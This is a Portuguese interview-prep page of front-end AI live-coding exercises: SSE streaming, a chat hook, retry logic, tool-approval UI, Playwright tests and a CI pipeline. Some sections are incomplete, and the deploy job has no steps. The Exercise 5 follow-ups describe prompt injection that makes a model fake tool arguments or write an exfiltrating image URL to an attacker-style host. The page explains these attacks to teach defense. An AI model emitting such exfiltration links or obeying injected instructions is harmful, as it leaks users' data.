Prática: live coding e system design de IA

~16h, em sessões de 45 min · o que a entrevista pede pra você fazer, não pra explicar

As páginas R1–R6 ensinam a explicar. Esta treina o outro formato da entrevista: alguém te dá um enunciado e 45 minutos. São doze exercícios de live coding tirados das frentes do roadmap (streaming, estado de chat, retry, componente de design system, Generative UI com aprovação humana, Playwright com axe, ci.yml com deploy por OIDC, servidor MCP, RAG com pgvector, stories com teste de acessibilidade, refatoração pra Server Component e um toast construído a partir de um mock) e um caso completo de front-end system design: a interface de um assistente de IA, a pergunta mais comum em vaga de Frontend com foco em IA. Cada exercício tem enunciado do jeito que o entrevistador fala, o que ele observa, dicas que você abre só se travar, solução comentada e as perguntas que vêm depois. Base teórica: R1 pros exercícios 1, 2, 3 e 5; R2 pros 4, 10 e 12; R3 pro 11; R4 pros 6 e 9; R5 pro 7; R6 pro 8; e o framework RADIO do B14 pro caso de system design. Os exercícios 6 a 12 cobrem os pedidos do roadmap que os dois projetos ainda não fazem, e é aqui que a resposta “não usei em produção, mas fiz o exercício” ganha corpo.

Tópicos

Como treinar

  1. Cronômetro e editor sem IA. Desligue o Copilot e o autocomplete de IA. Na entrevista você não vai ter, e é exatamente o músculo que esta página treina.
  2. Fale enquanto faz. Antes de escrever, repita o enunciado com suas palavras e faça 2 ou 3 perguntas de esclarecimento. O entrevistador avalia o raciocínio tanto quanto o código, e silêncio de 10 minutos é o erro mais comum.
  3. Caminho feliz primeiro, bordas depois. Faça funcionar no caso simples, diga em voz alta quais bordas vai tratar, e trate na ordem de importância. Código pela metade com um plano claro vale mais que código perfeito pela metade sem plano.
  4. Dica custa. Só abra a dica depois de 10 minutos travado, e anote que precisou dela. Se precisou, o exercício volta pra fila: refaça do zero em 3 dias e de novo em uma semana.
  5. Compare com a solução e com as perguntas de depois. A solução não é a única certa, mas cada decisão dela tem um motivo escrito. As perguntas de follow-up são onde se separa pleno de sênior.

O que o entrevistador anota num live coding de front-end: perguntou antes de sair codando; nomeou estados e bordas; código legível com nomes de domínio; tratou erro e cancelamento; pensou em acessibilidade sem ser lembrado; testou (nem que seja descrevendo como testaria); e soube explicar o trade-off quando provocado.

EX 1

Ler a resposta de um LLM em streaming

40 min · JS puro · R1

“Nosso endpoint POST /api/chat devolve a resposta do modelo em Server-Sent Events: eventos data: {"delta":"..."} separados por linha em branco, terminando em data: [DONE]. Escreva streamChat(prompt, { onDelta, signal }): chama o endpoint, entrega cada pedaço de texto conforme chega e, no fim, diz qual foi o texto completo. Sem biblioteca.”

Requisitos que você deve levantar (ou perguntar)

  • Um pedaço da rede não respeita a fronteira de evento: um data: pode chegar partido em dois.
  • Um caractere UTF-8 de vários bytes (ç, ã, emoji) também pode chegar partido.
  • HTTP não-ok vira erro com o status; o chamador pode cancelar (AbortSignal).
  • Linhas que não são data: (comentário : ping, event:, id:) são ignoradas.
  • A conexão pode fechar sem o [DONE]: isso é resposta truncada, e quem chama precisa saber.

O que o entrevistador observa

  • Se você usa um buffer e só processa até a última fronteira completa.
  • Se o TextDecoder recebe { stream: true }.
  • Se checa response.ok antes de ler, e se libera a conexão quando sai cedo (erro, [DONE], abort).
dica 1

Acumule texto num buffer. Divida por "\n\n": todos os pedaços menos o último são eventos completos; o último volta pro buffer, porque pode estar pela metade.

dica 2

new TextDecoder().decode(bytes, { stream: true }) guarda os bytes de um caractere incompleto e só os entrega quando o resto chega. Sem isso, um ç partido vira �. No fim, chame decode() sem argumentos pra esvaziar.

dica 3

Passe o signal pro fetch: quando abortar, o reader.read() pendente rejeita com AbortError. Num finally, reader.cancel() fecha a conexão se você saiu antes do fim do stream.

solução comentada
export async function streamChat(prompt, { onDelta, signal } = {}) {
  const res = await fetch('/api/chat', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', Accept: 'text/event-stream' },
    body: JSON.stringify({ prompt }),
    signal,
  });
  if (!res.ok || !res.body) throw new Error(`Falha HTTP ${res.status}`);

  const reader = res.body.getReader();
  const decoder = new TextDecoder();
  let buffer = '';
  let texto = '';

  // processa um evento completo; devolve true quando é o [DONE]
  function processa(evento) {
    for (const linha of evento.split('\n')) {
      if (!linha.startsWith('data:')) continue; // ": ping", "event:", "id:"
      const dado = linha.slice(5).trim();
      if (dado === '[DONE]') return true;
      const { delta } = JSON.parse(dado);
      texto += delta;
      onDelta?.(delta);
    }
    return false;
  }

  try {
    while (true) {
      const { done, value } = await reader.read();
      buffer += done ? decoder.decode() : decoder.decode(value, { stream: true });
      const eventos = buffer.split('\n\n');
      buffer = eventos.pop(); // o último pode estar pela metade (ou ser só o '' depois do \n\n)
      for (const evento of eventos) {
        if (processa(evento)) return { texto, completo: true };
      }
      // fechou sem [DONE]: truncada. O que sobrou no buffer é evento sem a linha em branco
      // no fim; a spec de SSE manda descartá-lo, e processá-lo daria SyntaxError
      if (done) return { texto, completo: false };
    }
  } finally {
    // saiu antes do fim (erro de parse, [DONE], abort): fecha a conexão de verdade
    reader.cancel().catch(() => {});
  }
}

Perguntas que vêm depois
  1. Por que não usar EventSource, que já faz o parse de SSE?
    ver resposta

    EventSource só faz GET, sem corpo e sem header customizado (autenticação só por cookie). O prompt e o histórico precisam ir num POST, então é fetch + leitor. O que você perde é a reconexão automática com Last-Event-ID; se o produto precisar retomar stream, isso vira trabalho seu (o servidor numera os eventos e aceita “continue a partir do id N”).

  2. A conexão caiu no meio da resposta. O que a interface faz?
    ver resposta

    Mantém o texto parcial na tela, marcado como interrompido, e oferece tentar de novo ou continuar. Apagar o que o usuário já leu é a pior opção. Se o servidor gravar a geração por id de mensagem, dá pra retomar sem pagar os tokens de novo; senão, regenerar. E vale distinguir na métrica: queda de rede, timeout do proxy e erro do modelo são causas diferentes.

  3. Com respostas longas, a página engasga. Onde está o problema?
    ver resposta

    Raramente na rede. Cada delta vira uma atualização de estado e um re-render; se o texto passa por um parser de markdown inteiro a cada token, o custo cresce com o tamanho (o total fica quadrático). Remédio: acumular os deltas e pintar uma vez por quadro (requestAnimationFrame) ou com throttle de ~50 ms, e só reprocessar o último bloco de markdown. Mede-se no painel Performance e no INP enquanto o stream roda.

  4. O servidor manda \r\n em vez de \n. Seu código quebra?
    ver resposta

    Quebra: a spec de SSE aceita \r\n, \n e \r como fim de linha, e o split por "\n\n" não acharia a fronteira. A correção simples é normalizar ao decodificar (.replace(/\r\n?/g, '\n')), com cuidado porque um \r pode chegar no fim de um pedaço e o \n no começo do outro. Bom momento pra dizer “em produção eu usaria um parser testado, como o eventsource-parser; aqui escrevi à mão pra mostrar o mecanismo”.

EX 2

Um useChat simplificado

45 min · React + TS · R1

“Implemente um hook useChat() que guarda a conversa, envia a pergunta, mostra a resposta chegando em streaming e deixa o usuário parar e tentar de novo. Use o streamChat do exercício anterior.”

type Status = 'ready' | 'submitted' | 'streaming' | 'error';
type Msg = { id: string; role: 'user' | 'assistant'; text: string; incompleta?: boolean };

function useChat(): {
  messages: Msg[]; status: Status; error: Error | null;
  send(text: string): boolean; stop(): void; retry(): void; // send diz se aceitou o envio
};

Requisitos

  • A pergunta aparece na hora (otimista); submitted até o primeiro pedaço, streaming depois.
  • stop() mantém o texto parcial, marcado como incompleto.
  • Uma requisição por vez; desmontar o componente cancela a requisição.
  • retry() reenvia a última pergunta e descarta a resposta que falhou. Erro nunca apaga o histórico.

O que o entrevistador observa

  • Se o status é uma máquina de estados explícita, e não três booleanos (isLoading, isStreaming, hasError) que podem se contradizer.
  • Se você atualiza a mensagem com setState funcional e por id, não “a última da lista”.
  • Se o AbortController mora num ref e se há cleanup no unmount.
dica 1

Gere o id da mensagem do assistente antes de chamar o stream. Todo delta atualiza ms.map(m => m.id === id ? ... : m). Assim uma resposta antiga nunca escreve na mensagem nova.

dica 2

“Está ocupado?” pode ser lido do ref do controller (ctrlRef.current !== null) em vez do status: o ref não sofre de closure velha, e um duplo clique rápido não dispara duas requisições.

solução comentada
import { useCallback, useEffect, useRef, useState } from 'react';
import { streamChat } from './stream-chat';

export function useChat() {
  const [messages, setMessages] = useState<Msg[]>([]);
  const [status, setStatus] = useState<Status>('ready');
  const [error, setError] = useState<Error | null>(null);
  const ctrlRef = useRef<AbortController | null>(null);
  const messagesRef = useRef(messages);
  useEffect(() => { messagesRef.current = messages; }, [messages]);

  const run = useCallback(async (pergunta: string) => {
    const ctrl = new AbortController();
    ctrlRef.current = ctrl; // antes de qualquer await: bloqueia o duplo clique
    const id = crypto.randomUUID();
    // atualiza só a mensagem DESTA requisição
    const patch = (fn: (m: Msg) => Msg) =>
      setMessages((ms) => ms.map((m) => (m.id === id ? fn(m) : m)));

    setError(null);
    setStatus('submitted');
    try {
      let primeiro = true;
      const { completo } = await streamChat(pergunta, {
        signal: ctrl.signal,
        onDelta: (delta: string) => {
          if (primeiro) {
            primeiro = false;
            setStatus('streaming');
            setMessages((ms) => [...ms, { id, role: 'assistant', text: delta }]);
          } else {
            patch((m) => ({ ...m, text: m.text + delta }));
          }
        },
      });
      if (completo) {
        setStatus('ready');
      } else {
        patch((m) => ({ ...m, incompleta: true }));
        setError(new Error('A resposta foi interrompida.'));
        setStatus('error');
      }
    } catch (e) {
      if (ctrl.signal.aborted) {
        patch((m) => ({ ...m, incompleta: true })); // parar mantém o parcial
        setStatus('ready');
      } else {
        setError(e as Error);
        setStatus('error');
      }
    } finally {
      if (ctrlRef.current === ctrl) ctrlRef.current = null;
    }
  }, []);

  const send = useCallback((texto: string): boolean => {
    const t = texto.trim();
    if (!t || ctrlRef.current) return false; // uma requisição por vez
    setMessages((ms) => [...ms, { id: crypto.randomUUID(), role: 'user', text: t }]);
    void run(t);
    return true;
  }, [run]);

  const retry = useCallback(() => {
    if (ctrlRef.current) return;
    const ms = messagesRef.current;
    const i = ms.findLastIndex((m) => m.role === 'user');
    if (i < 0) return;
    setMessages(ms.slice(0, i + 1)); // descarta a resposta que falhou ou foi cortada
    void run(ms[i].text);
  }, [run]);

  const stop = useCallback(() => ctrlRef.current?.abort(), []);
  useEffect(() => () => ctrlRef.current?.abort(), []); // desmontou: cancela

  return { messages, status, error, send, stop, retry };
}

Decisões pra verbalizar: o campo não é desabilitado durante a resposta (desabilitar tira o foco de quem usa teclado; o send já ignora envio duplicado); a região role="status" existe sempre na página, vazia ou não, porque leitor de tela só anuncia mudança em região que já estava lá; e a mensagem do usuário entra antes da rede responder.

Perguntas que vêm depois
  1. Seu streamChat manda só a pergunta. Como o modelo lembra da conversa?
    ver resposta

    Não lembra: a API do modelo não tem estado. O cliente manda o conversationId e o servidor monta o histórico a partir do banco (ou o cliente manda as mensagens, como o useChat do AI SDK faz). Em conversas longas o histórico estoura a janela de contexto, então o servidor corta pelas mais recentes, resume as antigas, ou busca só as relevantes. Montar no servidor também impede o cliente de forjar uma mensagem “do assistente”.

  2. Como você testaria esse hook?
    ver resposta

    Mockando o módulo stream-chat com uma função controlável (que chama onDelta quando o teste mandar e resolve ou rejeita depois) e testando pelo componente com Testing Library: digitar, enviar, ver “Pensando…”, emitir um delta, ver o texto; clicar em Parar e ver “(interrompida)”; rejeitar e ver o botão “Tentar de novo”. Consultas por papel e nome (getByRole('button', { name: 'Parar' })), não por classe.

  3. Por que não guardar a conversa num estado global (Zustand, Redux) desde o começo?
    ver resposta

    Porque, enquanto só um componente usa, estado local é mais simples e morre junto com a tela. Vira global quando outras partes precisam ler o mesmo stream (lista lateral mostrando “respondendo…”, título gerado da conversa) ou quando o stream precisa sobreviver a uma troca de rota. E a lista de conversas e o histórico salvo são estado de servidor: TanStack Query, não store de cliente (B15).

EX 3

fetchWithRetry com backoff, jitter e Retry-After

35 min · TS · R1/R4

“A API do modelo devolve 429 e 503 de vez em quando. Escreva fetchWithRetry(url, init, opcoes): repete com backoff exponencial, respeita o Retry-After quando vier, não repete o que não adianta repetir, e o chamador consegue cancelar a qualquer momento — inclusive durante a espera.”

Requisitos

  • Padrões: 3 tentativas no total, base de 500 ms, teto de 8 s por espera.
  • Repete: erro de rede, 408, 429, 500, 502, 503, 504. Não repete: os outros 4xx, nem um abort do chamador.
  • Retry-After pode vir em segundos ("20") ou como data HTTP.
  • Esgotou as tentativas: devolve a última resposta (ou lança o último erro), pra quem chama decidir a mensagem.

O que o entrevistador observa

  • Se você sabe por que existe jitter, não só que ele existe.
  • Se o abort interrompe o setTimeout da espera (o erro clássico é o cancelamento só valer pra próxima requisição).
  • Se você descarta o corpo da resposta antes de tentar de novo, e o que faz quando o servidor pede pra esperar mais que o teto.
dica 1

Full jitter: Math.random() * Math.min(teto, base * 2 ** (tentativa - 1)). Sem aleatoriedade, mil clientes que falharam juntos voltam juntos, no mesmo milissegundo, e derrubam o serviço de novo.

dica 2

A espera cancelável é uma Promise que resolve no setTimeout e rejeita no evento abort do signal — e cada caminho limpa o outro.

solução comentada
const REPETIVEIS = new Set([408, 429, 500, 502, 503, 504]);

type Opcoes = { tentativas?: number; baseMs?: number; tetoMs?: number };

export async function fetchWithRetry(
  url: string,
  init: RequestInit = {},
  { tentativas = 3, baseMs = 500, tetoMs = 8_000 }: Opcoes = {},
): Promise<Response> {
  // full jitter: espalha os clientes que falharam juntos
  const backoff = (i: number) => Math.random() * Math.min(tetoMs, baseMs * 2 ** (i - 1));

  for (let i = 1; ; i++) {
    let res: Response;
    try {
      res = await fetch(url, init);
    } catch (e) {
      // abort do chamador nunca é repetido; erro de rede é, até esgotar
      if (init.signal?.aborted || i >= tentativas) throw e;
      await espera(backoff(i), init.signal);
      continue;
    }

    if (res.ok || !REPETIVEIS.has(res.status) || i >= tentativas) return res;

    const pedido = retryAfterMs(res.headers.get('Retry-After'));
    // o servidor pediu mais que o teto: não adianta insistir agora.
    // Devolve pro chamador mostrar "tente de novo em X s".
    if (pedido !== null && pedido > tetoMs) return res;

    await res.body?.cancel(); // libera a conexão antes de esperar
    await espera(pedido ?? backoff(i), init.signal);
  }
}

function retryAfterMs(valor: string | null): number | null {
  if (!valor) return null;
  const segundos = Number(valor);
  if (Number.isFinite(segundos)) return Math.max(0, segundos * 1000);
  const data = Date.parse(valor); // "Wed, 21 Oct 2026 07:28:00 GMT"
  return Number.isNaN(data) ? null : Math.max(0, data - Date.now());
}

function espera(ms: number, signal?: AbortSignal | null): Promise<void> {
  return new Promise((resolve, reject) => {
    if (signal?.aborted) return reject(signal.reason);
    const onAbort = () => { clearTimeout(t); reject(signal!.reason); };
    const t = setTimeout(() => {
      signal?.removeEventListener('abort', onAbort);
      resolve();
    }, ms);
    signal?.addEventListener('abort', onAbort, { once: true });
  });
}

Perguntas que vêm depois
  1. É seguro repetir um POST?
    ver resposta

    Depende de ele ser idempotente. Uma chamada ao LLM repetida só custa tokens; um POST que cria pagamento ou reserva pode duplicar. O padrão é o cliente mandar um Idempotency-Key (o mesmo em todas as tentativas) e o servidor devolver o resultado guardado quando a chave repete. Sem isso, só se repete com segurança o que a spec do HTTP já define como idempotente (GET, PUT, DELETE).

  2. O retry fica no cliente ou no servidor?
    ver resposta

    No servidor, pros erros transitórios rápidos: o usuário nem percebe. Na interface, quando as tentativas esgotam, vira um botão “tentar de novo”. O erro a evitar é retry automático nas duas camadas: 3 tentativas no cliente × 3 no servidor são até 9 chamadas ao modelo por clique, justamente quando ele está sobrecarregado (amplificação de retry).

  3. Retry resolve um modelo que está fora do ar por 10 minutos?
    ver resposta

    Não, só piora a carga. Pra falha prolongada entra o circuit breaker: depois de N falhas seguidas, o circuito abre e as chamadas falham na hora por um tempo, sem bater no serviço; depois, uma chamada de teste decide se fecha. Na interface isso vira degradação explícita (“a explicação da IA está indisponível agora”) em vez de spinner eterno.

EX 4

O <Button> do design system

40 min · React + TS + Tailwind · R2

“Crie o botão do nosso design system: variantes intent (primary, secondary, danger, ghost) e size (sm, md, lg), estado de carregamento e uma versão só com ícone. Tem que ser tipado: intent="danjer" não pode compilar. E acessível.”

Requisitos que você deve levantar

  • type="button" por padrão (dentro de um <form>, o padrão do HTML é submit).
  • Carregando: não aceita clique, mas continua focável e com o mesmo nome acessível.
  • Só ícone: o TypeScript exige aria-label; o ícone fica escondido do leitor de tela.
  • Classes vindas de tokens semânticos (bg-brand), nunca de cor crua (bg-orange-500).

O que o entrevistador observa

  • Se você conhece compoundVariants e defaultVariants, e deriva o tipo com VariantProps.
  • A diferença entre disabled e aria-disabled.
  • Se a regra “só ícone precisa de nome” está no tipo, e não num comentário.

EX 5

Generative UI com aprovação humana

45 min · React + TS · R1/R6

“A resposta do assistente chega como uma lista de parts. Renderize cada uma: texto, ferramenta rodando, resultado e erro. Temos duas ferramentas: buscarVoos e reservarVoo. Reservar cobra no cartão, então precisa da aprovação do usuário antes de executar.”

type Voo = { id: string; cia: string; partida: string; preco: number };

type Estado<I, O> =
  | { state: 'input-available'; input: I }                    // rodando
  | { state: 'approval-requested'; input: I }                 // esperando o usuário
  | { state: 'output-available'; input: I; output: O }
  | { state: 'output-error'; input: I; errorText: string }
  | { state: 'output-denied'; input: I };                     // usuário recusou

type Part =
  | { type: 'text'; text: string }
  | ({ type: 'tool-buscarVoos'; id: string } & Estado<{ origem: string; destino: string }, Voo[]>)
  | ({ type: 'tool-reservarVoo'; id: string } & Estado<{ vooId: string; passageiros: number }, { localizador: string }>);

Requisitos

  • Cada estado tem uma UI: esqueleto enquanto roda, componente com o dado, erro localizado naquele bloco (sem derrubar a conversa).
  • O cartão de aprovação mostra o que vai acontecer em termos que o usuário entende, com dois botões, e não aceita clique duplo.
  • Um tipo de part desconhecido (o back-end ganhou uma ferramenta nova) não quebra a tela.

O que o entrevistador observa

  • Se o switch no type e no state deixa o TypeScript estreitar o tipo (sem as).
  • De onde vêm os dados do cartão de aprovação: dos argumentos que o modelo escreveu ou de uma fonte confiável.
  • Se o texto do modelo é renderizado com segurança.
dica 1

Extract<Part, { type: 'tool-reservarVoo' }> dá o tipo da prop de cada componente de ferramenta. Dentro dele, um switch (part.state) estreita o resto.

dica 2

O modelo pode escrever qualquer coisa nos argumentos, inclusive um preço falso induzido por prompt injection. Mostre o voo pelo vooId, buscado no resultado da sua própria ferramenta de busca, e não um “resumo” que o modelo mandou.

solução comentada
import { useId, useState } from 'react';

const brl = new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' });
const hora = new Intl.DateTimeFormat('pt-BR', { dateStyle: 'short', timeStyle: 'short' });

export function MensagemAssistente({ parts, onAprovar }: {
  parts: Part[];
  onAprovar: (toolCallId: string, aprovado: boolean) => void;
}) {
  // voos que a NOSSA ferramenta devolveu: fonte confiável pro cartão de aprovação
  const voos = new Map(
    parts.flatMap((p) =>
      p.type === 'tool-buscarVoos' && p.state === 'output-available'
        ? p.output.map((v) => [v.id, v] as const)
        : [],
    ),
  );

  return (
    <div className="space-y-3">
      {parts.map((part, i) => {
        switch (part.type) {
          case 'text':
            return <Markdown key={i} texto={part.text} />; // sem HTML cru (ver follow-up)
          case 'tool-buscarVoos':
            return <ResultadoVoos key={part.id} part={part} />;
          case 'tool-reservarVoo':
            return <Reserva key={part.id} part={part} voo={voos.get(part.input.vooId)} onAprovar={onAprovar} />;
          default:
            // em runtime pode chegar um tipo que este front não conhece
            return <p key={i} className="text-ink-soft">Este conteúdo não pode ser exibido aqui.</p>;
        }
      })}
    </div>
  );
}

function ResultadoVoos({ part }: { part: Extract<Part, { type: 'tool-buscarVoos' }> }) {
  const rota = `${part.input.origem} → ${part.input.destino}`;
  switch (part.state) {
    case 'input-available':
      return <div role="status" className="skeleton h-24">Buscando voos {rota}…</div>;
    case 'output-error':
      return <p role="alert">Não consegui buscar voos {rota} agora.</p>;
    case 'output-available':
      if (part.output.length === 0) return <p>Nenhum voo encontrado {rota}.</p>;
      return (
        <ul aria-label={`Voos ${rota}`}>
          {part.output.map((v) => (
            <li key={v.id}>{v.cia} · {hora.format(new Date(v.partida))} · {brl.format(v.preco)}</li>
          ))}
        </ul>
      );
    default:
      return null; // busca não pede aprovação
  }
}

function Reserva({ part, voo, onAprovar }: {
  part: Extract<Part, { type: 'tool-reservarVoo' }>;
  voo: Voo | undefined;
  onAprovar: (toolCallId: string, aprovado: boolean) => void;
}) {
  const [respondido, setRespondido] = useState(false);
  const tituloId = useId();
  const responder = (ok: boolean) => { setRespondido(true); onAprovar(part.id, ok); };

  switch (part.state) {
    case 'approval-requested':
      return (
        <section role="group" aria-labelledby={tituloId} className="card">
          <h4 id={tituloId}>Confirmar a reserva?</h4>
          {voo ? (
            <p>
              {voo.cia}, {hora.format(new Date(voo.partida))}, {part.input.passageiros} passageiro(s):{' '}
              <strong>{brl.format(voo.preco * part.input.passageiros)}</strong> no cartão salvo.
            </p>
          ) : (
            <p role="alert">Não encontrei esse voo nos resultados da busca. Não confirme sem conferir.</p>
          )}
          <button type="button" disabled={respondido || !voo} onClick={() => responder(true)}>Reservar</button>
          <button type="button" disabled={respondido} onClick={() => responder(false)}>Não reservar</button>
        </section>
      );
    case 'input-available':
      return <p role="status">Reservando…</p>;
    case 'output-available':
      return <p role="status">Reserva feita. Localizador <strong>{part.output.localizador}</strong>.</p>;
    case 'output-denied':
      return <p>Reserva não feita: você recusou.</p>;
    case 'output-error':
      return <p role="alert">A reserva falhou: {part.errorText}</p>;
  }
}

Por que o disabled aqui está certo, se no exercício 4 ele era evitado: depois da resposta o botão não tem mais o que fazer e o cartão vai mudar de estado. Lá, o botão voltava a funcionar no fim do carregamento e o foco precisava continuar nele.

Perguntas que vêm depois
  1. A aprovação está no front. Isso basta pra impedir uma reserva não autorizada?
    ver resposta

    Não. O front coleta a decisão; quem exige é o servidor: a ferramenta reservarVoo só executa se existir uma aprovação registrada pra aquele toolCallId, daquele usuário. E, na execução, o servidor revalida tudo (o voo existe, o preço é o mesmo de quando o usuário aprovou). Se mudou, pede aprovação de novo. Qualquer regra que só existe no cliente pode ser pulada com uma chamada direta à API.

  2. Como o texto do modelo deve ser renderizado?
    ver resposta

    Como entrada não confiável. Markdown sem HTML cru (o react-markdown ignora HTML por padrão; nunca dangerouslySetInnerHTML com saída de modelo), links com o domínio visível e rel="noopener noreferrer". E imagens externas não carregam sozinhas: um prompt injection pode fazer o modelo escrever ![](https://atacante.com/x?dados=...), e só renderizar a imagem já manda os dados pra fora. Bloqueie, passe por proxy ou peça um clique; a CSP com img-src restrito é a segunda barreira.

  3. Pedir aprovação pra toda ferramenta não seria mais seguro?
    ver resposta

    Seria mais seguro no papel e menos na prática: confirmação pra tudo treina o usuário a clicar “sim” sem ler. Aprovação entra onde a ação é irreversível, custa dinheiro ou fala em nome do usuário, e de preferência por regra dinâmica (reserva acima de um valor, e-mail pra fora da empresa). Buscar voos é leitura: roda direto.

Teste end-to-end do chat com Playwright e axe

40 min · Playwright + TS · R2/R4

“Escreva o teste end-to-end do chat dos exercícios 1 e 2. O CI não pode chamar o modelo de verdade. Quero um teste em que a resposta aparece, outro em que o servidor devolve 503 e o usuário consegue tentar de novo, e uma checagem de acessibilidade da tela com a resposta na página.”

Requisitos que você deve levantar

  • O modelo é lento, caro e não determinístico: a rede é interceptada, e a resposta vem de um corpo SSE gravado.
  • Seletores por papel e nome acessível (getByRole, getByLabel), não por classe nem por data-testid.
  • Sem waitForTimeout: o Playwright espera as asserções sozinho.
  • O axe roda com as tags da WCAG 2.1 A e AA, e depois que a resposta apareceu.

O que o entrevistador observa

  • Se você sabe o que um teste e2e cobre que o unitário não cobre, e vice-versa.
  • Se o teste do erro conta as chamadas dentro do handler da rota, pra provar que o retry foi de fato uma segunda requisição.
  • Se você lembra que acessibilidade automatizada acha só uma parte dos problemas.
dica 1

route.fulfill({ status, headers, body }) responde sem ir à rede. Pra SSE, o content-type é text/event-stream e o corpo é o texto data: {...}\n\n repetido, terminando em data: [DONE]\n\n.

dica 2

No segundo teste, o handler da rota decide pela contagem de chamadas: a primeira devolve 503, a segunda devolve a resposta boa. Assim a mesma URL se comporta como uma API instável de verdade.

dica 3

new AxeBuilder({ page }).analyze() audita o DOM do momento. Se rodar antes de a resposta chegar, você audita a tela vazia e o teste passa sem provar nada. Espere a asserção do texto antes.

solução comentada
import { test, expect } from '@playwright/test';
import AxeBuilder from '@axe-core/playwright';

// monta o corpo SSE que o endpoint real devolveria
const sse = (...deltas: string[]) =>
  deltas.map((d) => `data: ${JSON.stringify({ delta: d })}\n\n`).join('') + 'data: [DONE]\n\n';

const resposta = (body: string) => ({
  status: 200,
  headers: { 'content-type': 'text/event-stream' },
  body,
});

test('mostra a resposta e não tem violação de acessibilidade', async ({ page }) => {
  await page.route('**/api/chat', (route) =>
    route.fulfill(resposta(sse('Nonce é ', 'um valor ', 'por request.'))),
  );
  await page.goto('/chat');

  await page.getByLabel('Sua pergunta').fill('O que é nonce?');
  await page.getByRole('button', { name: 'Enviar' }).click();

  // espera pelo resultado, nunca por tempo
  await expect(page.getByText('Nonce é um valor por request.')).toBeVisible();
  await expect(page.getByRole('button', { name: 'Enviar' })).toBeVisible(); // voltou ao estado "ready"

  const axe = await new AxeBuilder({ page })
    .withTags(['wcag2a', 'wcag2aa', 'wcag21a', 'wcag21aa'])
    .analyze();
  expect(axe.violations).toEqual([]);
});

test('503 mostra "Tentar de novo" e a segunda tentativa funciona', async ({ page }) => {
  let chamadas = 0;
  await page.route('**/api/chat', (route) => {
    chamadas += 1;
    return chamadas === 1
      ? route.fulfill({ status: 503, body: 'indisponível' })
      : route.fulfill(resposta(sse('Pronto.')));
  });
  await page.goto('/chat');
  await page.getByLabel('Sua pergunta').fill('Oi');
  await page.getByRole('button', { name: 'Enviar' }).click();

  await expect(page.getByRole('alert')).toContainText('Falha HTTP 503');
  await page.getByRole('button', { name: 'Tentar de novo' }).click();

  await expect(page.getByText('Pronto.')).toBeVisible();
  expect(chamadas).toBe(2); // o retry foi uma segunda requisição de verdade
});

Perguntas que vêm depois
  1. O route.fulfill entrega o corpo inteiro de uma vez. Então esse teste não prova o streaming. Como você testa o streaming de verdade?
    ver resposta

    O end-to-end valida a integração (a tela, o endpoint e os estados); as bordas do protocolo (evento e caractere partidos entre pedaços, conexão que cai) são do teste unitário do leitor, como o do exercício 1. Quando for preciso atrasar ou fatiar a resposta no e2e, o caminho é um servidor de teste pequeno que escreve o corpo em intervalos, ou, pra WebSocket, o page.routeWebSocket.

  2. O axe passou sem violação. Pode dizer que a tela é acessível?
    ver resposta

    Não. A ferramenta automática acha uma parte dos problemas: contraste, nome faltando, ARIA inválido, id repetido. Não acha se a ordem do foco faz sentido, se o texto alternativo descreve a imagem, se o fluxo é possível só com o teclado, ou como um leitor de tela lê a página. O axe guarda o piso (nada novo quebra em silêncio); a revisão manual com teclado e leitor de tela continua.

    ver resposta

    Pelo trace da execução que falhou, não por um waitForTimeout maior. Teste instável não se resolve com retries alto: o retry esconde o sintoma, e o trace mostra a causa.

ci.yml no quadro: do pull request ao deploy na AWS

35 min · GitHub Actions · R5

“Escreva o pipeline do nosso monorepo Next.js com Postgres. Em todo pull request roda lint, typecheck, testes e build; os testes usam um Postgres de verdade. Quando algo entra na main, faz deploy na AWS, e eu não quero chave da AWS guardada no GitHub.”

Requisitos que você deve levantar

  • Feedback rápido e barato: cache do gerenciador de pacotes e cancelamento de execução obsoleta.
  • Postgres descartável, com espera até ficar saudável antes dos testes.
  • Permissões mínimas por padrão; só o job de deploy pode pedir o token OIDC.
  • O deploy só roda depois do CI, só na main, e a role da AWS só aceita esse repositório e essa branch.

O que o entrevistador observa

  • Se você escreve permissions explícito (o padrão do token pode ser largo demais).
  • Se sabe o que concurrency e needs fazem, e onde o cancel-in-progress é perigoso.
  • Se a trust policy tem a condição sub: sem ela, qualquer repositório com o mesmo provider poderia tentar assumir a role.
dica 1

Dois jobs: qualidade (roda em PR e em push) e deploy com needs: qualidade e um if que exige push na main. O token OIDC só é pedido no segundo.

dica 2

O container do Postgres demora a aceitar conexão. O options do service com --health-cmd pg_isready faz o GitHub esperar ele ficar saudável antes de iniciar os passos.

dica 3

Pra role: um provider de identidade pra token.actions.githubusercontent.com no IAM, e uma trust policy com sts:AssumeRoleWithWebIdentity, aud igual a sts.amazonaws.com e sub igual a repo:ORG/REPO:ref:refs/heads/main.

solução comentada
name: ci
on:
  pull_request:
  push: { branches: [main] }

concurrency:                       # push novo no mesmo PR cancela a execução anterior
  group: ci-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true

permissions: { contents: read }    # o mínimo pra todo job

jobs:
  qualidade:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    services:
      postgres:
        image: postgres:16
        env: { POSTGRES_PASSWORD: postgres, POSTGRES_DB: app_test }
        ports: ['5432:5432']
        options: >-
          --health-cmd "pg_isready -U postgres" --health-interval 5s
          --health-timeout 5s --health-retries 10
    env:
      DATABASE_URL: postgresql://postgres:postgres@localhost:5432/app_test
    steps:
      - uses: actions/checkout@v4
      - uses: pnpm/action-setup@v4
      - uses: actions/setup-node@v4
        with: { node-version: 22, cache: pnpm }
      - run: pnpm install --frozen-lockfile
      - run: pnpm turbo lint typecheck test build

  deploy:
    needs: qualidade
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'

Como defender cada linha: --frozen-lockfile faz o CI falhar se o lockfile não bate com o package.json, em vez de instalar outra coisa em silêncio; timeout-minutes impede um job travado de consumir a cota; o job de PR nem tem permissão de pedir o token, então código de um PR nunca assume role nenhuma; e a condição sub é o controle de verdade da role. Versões das actions são ilustrativas: use as atuais e, em produção, fixe por SHA.

Perguntas que vêm depois
  1. Posso pôr cancel-in-progress: true no job de deploy também?
    ver resposta

    Com cuidado. Em PR é ótimo, porque só importa o último commit. No deploy de produção, cancelar no meio pode deixar o ambiente pela metade (imagem enviada e serviço não atualizado). O mais seguro é um grupo de concurrency próprio pro deploy, com cancel-in-progress: false: o novo espera o anterior terminar, em fila.

  2. O CI do monorepo está levando 25 minutos. Como acelera?
    ver resposta

